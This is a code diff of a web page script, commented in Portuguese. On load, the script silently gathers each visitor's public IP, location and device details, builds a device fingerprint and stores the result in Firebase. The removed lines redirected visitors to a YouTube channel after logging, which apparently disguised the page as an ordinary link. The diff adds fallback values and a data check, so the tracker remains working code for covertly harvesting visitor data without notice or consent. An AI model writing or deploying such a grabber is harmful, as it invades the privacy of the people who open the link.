@@ -93,7 +93,6 @@
                     set(identifierRef, dataToSend)
                         .then(() => {
                             console.log('Informações atualizadas com sucesso no Firebase');
-							redirectToLink();
                         })
                         .catch((error) => {
                             console.error('Erro ao atualizar dados no Firebase:', error);
@@ -103,7 +102,6 @@
                     set(identifierRef, dataToSend)
                         .then(() => {
                             console.log('Novo rótulo criado com sucesso no Firebase');
-							redirectToLink();
                         })
                         .catch((error) => {
                             console.error('Erro ao criar novo rótulo no Firebase:', error);
@@ -129,11 +127,12 @@
             fetch(ipServiceURL)
                 .then(response => response.json())
                 .then(data => {	
-                    userIP = data.ip; // IP público
+                    userIP = data.ip || "IP não encontrado"; // Definir um valor padrão para IP se não for encontrado
                 })
                 .catch(error => {
                     locationDads = "Erro ao localizar";
                     console.error('Erro ao obter loc:', error);
+                    userIP = "Erro ao localizar IP"; // Definir valor de fallback para IP
                 });
 
             // Coleta as informações do dispositivo
@@ -143,18 +142,22 @@
             // Gera um identificador único para o dispositivo
             const identifier = generateDeviceIdentifier(deviceData);
 
-            // Prepara os dados para enviar ao Firebase
-            const dataToSend = {
-                ip: userIP,
-                location: locationDads,
-                device: deviceData,
-                additionalInfo: additionalInfo,
-                timestamp: new Date().toISOString(),
-                uniqueIdentifier: identifier
-            };
+            // Verifica se todos os dados estão definidos antes de enviar
+            if (userIP && locationDads && deviceData) {
+                const dataToSend = {
+                    ip: userIP,
+                    location: locationDads,
+                    device: deviceData,
+                    additionalInfo: additionalInfo,
+                    timestamp: new Date().toISOString(),
+                    uniqueIdentifier: identifier
+                };
 
-            // Envia os dados ou atualiza os dados no Firebase
-            updateFirebaseData(identifier, dataToSend);
+                // Envia os dados ou atualiza os dados no Firebase
+                updateFirebaseData(identifier, dataToSend);
+            } else {
+                console.error('Erro: Dados incompletos para enviar ao Firebase');
+            }
         }
 
         // Função para obter informações do dispositivo
@@ -212,15 +215,6 @@
 
         // Inicia a coleta de dados
         getIPAndLocation();
-
-
-
-function redirectToLink() {
-    updateMetaTags();
-    window.location.replace("https://www.youtube.com/@EpeneShit");
-}
-
-
 
     </script>
 
